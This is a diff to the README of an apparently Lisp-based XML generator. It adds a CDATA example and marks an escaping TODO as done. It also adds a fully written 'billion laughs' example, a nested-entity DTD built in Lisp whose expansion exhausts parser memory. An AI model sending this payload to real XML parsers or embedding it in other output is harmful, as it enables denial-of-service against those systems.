@@ -79,9 +79,35 @@ For lower case use the standard symbol character escaping (e.g. `:|RootElement|`
     "Content"))
 ```
 
+CDATA:
+
+```
+((:![CDATA[ "Raw data with symbols < >"))
+```
+
+[Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack):
+
+```
+((:?xml :version "1.0"))
+((:!doctype 'lolz "["
+  (progn
+    ((:!entity "lol0" (format nil "~s" "lol")))
+    ((:!element 'lolz "(#PCDATA)"))
+    (loop for i from 1 below 10
+      do ((:!entity (format nil "lol~a" i)
+                    (format nil "~s"
+                            (apply #'concatenate 'string
+                                   (loop repeat 10
+                                         collect (format nil "&lol~a;" (1- i))))))))
+    "")
+  "]"))
+((:lolz)
+  "&lol9;")
+```
+
 # TODO
 
 - [x] comments `<!-- ... -->`
-- [ ] escaping `<![CDATA[ ... ]]>`, ampersand escape sequences
+- [x] escaping `<![CDATA[ ... ]]>`, ampersand escape sequences
 - [ ] in-place computation of tags and attributes, seems hard to do
 - [ ] hook for transforming values which aren't tags, we're now accepting strings (perhaps using multiple values for distinguishing nil caused by tags from other values)
